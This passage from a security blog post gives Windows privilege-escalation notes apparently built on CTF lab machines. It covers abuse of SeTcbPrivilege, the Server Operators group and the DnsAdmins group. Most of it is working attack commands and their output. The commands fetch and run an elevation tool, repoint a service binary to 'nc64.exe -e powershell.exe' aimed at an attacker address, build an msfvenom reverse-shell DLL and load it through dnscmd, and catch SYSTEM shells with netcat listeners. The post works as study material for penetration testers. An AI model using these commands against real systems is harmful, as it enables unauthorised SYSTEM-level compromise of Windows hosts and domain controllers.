<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_deploy\Documents&gt; <span class="built_in">iwr</span> http://&lt;tun0&gt;/TcbElevation.exe <span class="literal">-outfile</span> TcbElevation.exe</span><br></pre></td></tr></table></figure>
<p>-&gt; <a target="_blank" rel="noopener" href="https://github.com/xct/rcat">https://github.com/xct/rcat</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_deploy\Documents&gt; upload rcat_10.<span class="number">8.0</span>.<span class="number">210</span>_443.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_deploy\Documents&gt; .\TcbElevation.exe pwn <span class="string">&quot;C:\Windows\system32\cmd.exe /c C:\Users\svc_deploy\Documents\rcat_10.8.0.210_443.exe&quot;</span></span><br><span class="line">Error starting service <span class="number">1053</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  rlwrap nc -nlvp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.8.0.210] from (UNKNOWN) [10.10.153.117] 53924</span><br><span class="line">Microsoft Windows [Version 10.0.20348.2113]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
<h1 id="Groups"><a href="#Groups" class="headerlink" title="Groups"></a>Groups</h1><h2 id="Server-Operators-Group"><a href="#Server-Operators-Group" class="headerlink" title="Server Operators Group"></a>Server Operators Group</h2><p>Its members can sign-in to a server, start and stop services, access domain controllers, perform maintenance tasks (such as backup and restore), and they have the ability to change binaries that are installed on the domain controllers.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; net user svc<span class="literal">-printer</span></span><br><span class="line">...</span><br><span class="line">Local <span class="built_in">Group</span> Memberships      *Print Operators      *Remote Management Use</span><br><span class="line">                             *Server Operators</span><br><span class="line">Global <span class="built_in">Group</span> memberships     *Domain Users</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; upload nc64.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; sc.exe config VMTools binPath=<span class="string">&quot;C:\temp\nc64.exe -e powershell.exe &lt;tun0&gt; &lt;port&gt;&quot;</span></span><br><span class="line">[<span class="type">SC</span>] ChangeServiceConfig SUCCESS</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; sc.exe stop VMTools</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: VMTools</span><br><span class="line">        <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : <span class="number">1</span>  STOPPED</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        CHECKPOINT         : <span class="number">0</span>x0</span><br><span class="line">        WAIT_HINT          : <span class="number">0</span>x0</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; sc.exe <span class="built_in">start</span> VMTools</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  rlwrap nc -nlvp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.14.30] from (UNKNOWN) [10.10.11.108] 49634</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
<h2 id="DnsAdmins-Group"><a href="#DnsAdmins-Group" class="headerlink" title="DnsAdmins Group"></a>DnsAdmins Group</h2><p>-&gt; <a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</a><br>When we are member of this group we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. We can re-configure the service and we have the required privileges to restart it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f dll -o shell.dll</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; upload shell.dll</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; cmd /c <span class="string">&#x27;dnscmd &lt;DC&gt; /config /serverlevelplugindll C:\temp\shell.dll&#x27;</span></span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; sc.exe \\&lt;DC&gt; stop dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns </span><br><span class="line">        <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : <span class="number">3</span>  STOP_PENDING </span><br><span class="line">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        CHECKPOINT         : <span class="number">0</span>x0</span><br><span class="line">        WAIT_HINT          : <span class="number">0</span>x0</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\temp&gt; sc.exe \\&lt;DC&gt; <span class="built_in">start</span> dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns </span><br><span class="line">        <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : <span class="number">2</span>  START_PENDING </span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        CHECKPOINT         : <span class="number">0</span>x0</span><br><span class="line">        WAIT_HINT          : <span class="number">0</span>x7d0</span><br><span class="line">        PID                : <span class="number">3500</span></span><br><span class="line">        FLAGS</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  rlwrap nc -nlvp 9001</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><ul>
<li><a target="_blank" rel="noopener" href="https://x.com/fr0gger_/status/1379465943965909000">https://x.com/fr0gger_/status/1379465943965909000</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/k4sth4/SeLoadDriverPrivilege">https://github.com/k4sth4/SeLoadDriverPrivilege</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</a></li>
<li><a target="_blank" rel="noopener" href="https://x.com/splinter_code/status/1568548572861267968">https://x.com/splinter_code/status/1568548572861267968</a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178">https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178</a></li>
<li><a target="_blank" rel="noopener" href="https://snowscan.io/htb-writeup-blackfield/">https://snowscan.io/htb-writeup-blackfield/</a></li>
<li><a target="_blank" rel="noopener" href="https://snowscan.io/htb-writeup-resolute/">https://snowscan.io/htb-writeup-resolute/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/a-d/movement/domain-settings/builtin-groups">https://www.thehacker.recipes/a-d/movement/domain-settings/builtin-groups</a></li>
<li><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</a></li>
</ul>
<h2 id="Machines-to-try"><a href="#Machines-to-try" class="headerlink" title="Machines to try:"></a>Machines to try:</h2><ul>
<li>Baby (Vulnlab)</li>
<li>Blackfield (HackTheBox)</li>
<li>Resolute (HackTheBox)</li>
<li>Fuse (HackTheBox)</li>
<li>POV (HackTheBox)</li>
<li>Job (Vulnlab)</li>
<li>Sidecar (Vulnlab)</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://seriotonctf.github.io">serioton</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://seriotonctf.github.io/2024/08/10/Windows-Privesc/">https://seriotonctf.github.io/2024/08/10/Windows-Privesc/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/07/24/RBCD-Notes/" title="Abusing Resource-Based Constrained Delegation"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F706ec838-be82-4b2b-8c99-8d6277ab92cd%2Fcat.png?table=block&amp;id=07e71d74-f62d-4bd0-89ed-82ea3ead23d8&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Abusing Resource-Based Constrained Delegation</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">serioton</div><div class="author-info__description">cat</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://twitter.com/seriotonctf"><i class="fab fa-twitter"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/seriotonctf" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://twitter.com/seriotonctf" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">A blog where I share writeups of machines and CTF challenges</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Privileges"><span class="toc-text">Privileges</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SeBackupPrivilege"><span class="toc-text">SeBackupPrivilege</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Disk-Shadow-method"><span class="toc-text">Disk Shadow method</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeLoadDriverPrivilege"><span class="toc-text">SeLoadDriverPrivilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-text">SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeDebugPrivilege"><span class="toc-text">SeDebugPrivilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeTcbPrivilege"><span class="toc-text">SeTcbPrivilege</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Groups"><span class="toc-text">Groups</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Server-Operators-Group"><span class="toc-text">Server Operators Group</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DnsAdmins-Group"><span class="toc-text">DnsAdmins Group</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Machines-to-try"><span class="toc-text">Machines to try:</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/10/Windows-Privesc/" title="Windows Privilege Escalation"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Feb66e480-7ab5-4a3e-bbd1-9c56c1cf2b3f%2Fcat2.png?table=block&amp;id=47c9e554-38f8-4c65-81cc-abad857404d6&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows Privilege Escalation"/></a><div class="content"><a class="title" href="/2024/08/10/Windows-Privesc/" title="Windows Privilege Escalation">Windows Privilege Escalation</a><time datetime="2024-08-10T15:00:00.000Z" title="Created 2024-08-10 15:00:00">2024-08-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/24/RBCD-Notes/" title="Abusing Resource-Based Constrained Delegation"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F706ec838-be82-4b2b-8c99-8d6277ab92cd%2Fcat.png?table=block&amp;id=07e71d74-f62d-4bd0-89ed-82ea3ead23d8&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Abusing Resource-Based Constrained Delegation"/></a><div class="content"><a class="title" href="/2024/07/24/RBCD-Notes/" title="Abusing Resource-Based Constrained Delegation">Abusing Resource-Based Constrained Delegation</a><time datetime="2024-07-24T16:33:01.000Z" title="Created 2024-07-24 16:33:01">2024-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/14/Phantom-Vulnlab/" title="Phantom - Vulnlab"><img src="https://wiki.vulnlab.com/~gitbook/image?url=https%3A%2F%2F3528174365-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FI3I73FFqB6GvT8N5Mt1N%252Fuploads%252FIdhQ6ryzfjA7Ybr9rjxo%252Fphantom_slide.png%3Falt%3Dmedia%26token%3Debd59b85-19c7-492c-b314-17222b2bc95e&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=e25427a4&amp;sv=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Phantom - Vulnlab"/></a><div class="content"><a class="title" href="/2024/07/14/Phantom-Vulnlab/" title="Phantom - Vulnlab">Phantom - Vulnlab</a><time datetime="2024-07-14T10:32:45.000Z" title="Created 2024-07-14 10:32:45">2024-07-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/30/Getting-started-with-Sliver-C2/" title="Getting started with Sliver C2"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F7eb1f0d8-846f-4281-a5ab-685c82ffed62%2Fsliver.png?table=block&amp;id=e322d194-1a07-4725-bbae-3fe4a66599ad&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Getting started with Sliver C2"/></a><div class="content"><a class="title" href="/2024/06/30/Getting-started-with-Sliver-C2/" title="Getting started with Sliver C2">Getting started with Sliver C2</a><time datetime="2024-06-30T13:14:31.000Z" title="Created 2024-06-30 13:14:31">2024-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/26/ADCS-Attacks-with-Certipy/" title="ADCS Attacks with Certipy"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F55bd30fb-924f-4b62-8c2d-8ef5b2b0bc34%2Fcat.png?table=block&amp;id=35840b9b-8958-455b-83ed-312be6e09422&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=2000&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ADCS Attacks with Certipy"/></a><div class="content"><a class="title" href="/2024/06/26/ADCS-Attacks-with-Certipy/" title="ADCS Attacks with Certipy">ADCS Attacks with Certipy</a><time datetime="2024-06-26T15:42:13.000Z" title="Created 2024-06-26 15:42:13">2024-06-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/train_travel_illustration-wallpaper-1920x1080.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By serioton</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">ฅ^•ﻌ•^ฅ</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div></div></body></html>